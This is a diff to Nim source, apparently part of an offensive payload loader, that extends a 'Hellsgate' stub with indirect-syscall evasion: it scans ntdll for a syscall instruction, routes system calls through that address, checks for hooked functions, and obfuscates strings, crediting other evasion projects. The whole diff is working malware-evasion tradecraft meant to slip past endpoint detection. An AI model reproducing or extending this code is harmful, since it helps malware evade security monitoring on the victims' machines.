@@ -137,12 +137,17 @@ let HellsgateStub*  = """
 when defined(Hellsgate):
 
     from os import paramStr
+    from random import randomize,rand
+
+    randomize()
     
     {.passC:"-masm=intel".}
     
         #[
             Windows Undocumented Structures - Windows 7+
         ]#
+    var 
+        syscallJumpAddress: ByteAddress
     
     type
         # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
@@ -397,6 +402,8 @@ when defined(Hellsgate):
         var 
             cx : DWORD = 0
             numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
+            DOWN = 32
+            UP = -32
         let 
             pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
             pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
@@ -417,6 +424,7 @@ when defined(Hellsgate):
                 if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                     tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
                     return true
+                # Credit: https://github.com/Haunted-Banshee/ErebusGate/blob/main/ErebusGate.nim
                 # Classic hook API 
                 # Check the the first byte is 0xe9
                 elif cast[PBYTE](cast[ByteAddress](pFuncAddr))[] == 0xE9:
@@ -446,6 +454,31 @@ when defined(Hellsgate):
             ret
         ===
     
+    # Credit: https://github.com/eversinc33/BouncyGate/blob/main/HellsGate.nim
+    proc getSyscallInstructionAddress(ntdllModuleBaseAddr: PVOID): ByteAddress =
+        ## Get The address of a syscall instruction from ntdll to make sure all syscalls go through ntdll
+        when defined(verbose):
+            echo obf("[*] Resolving syscall...")
+        when defined(verbose):
+            echo obf("[*] NTDDL Base: ") & $cast[int](ntdllModuleBaseAddr).toHex
+        #var
+        #    num = rand(75)
+        #    count: int = 0
+        var offset: UINT = 0
+        while true:
+            var currByte = cast[PDWORD](ntdllModuleBaseAddr + offset)[]
+            if "050F0375" in $currByte.toHex:
+                # Random Syscall instead of always the first one
+                #if (count == num):
+                when defined(verbose):
+                    echo obf("[*] Found syscall in ntdll addr ") & $cast[ByteAddress](ntdllModuleBaseAddr + offset).toHex & ": " & $currByte.toHex
+                return cast[ByteAddress](ntdllModuleBaseAddr + offset) + sizeof(WORD)
+            offset = offset + 1
+
+        when defined(verbose):
+            echo obf("[!] Did not find a syscall instruction in ntdll...")
+        quit(1)
+
     proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
         flink = flink.Flink[]
         return flinkToModule(flink)
@@ -468,7 +501,9 @@ when defined(Hellsgate):
                 if beginModule == currModule:
                     break
                 continue
-    
+            if obf("ntdll") in moduleName.toLower():
+                syscallJumpAddress = getSyscallInstructionAddress(currModule.DLLBase)
+            
             if not getExportTable(currModule, pExportTable):
                 when defined(verbose):
                     echo obf("[-] Failed to get export table...")
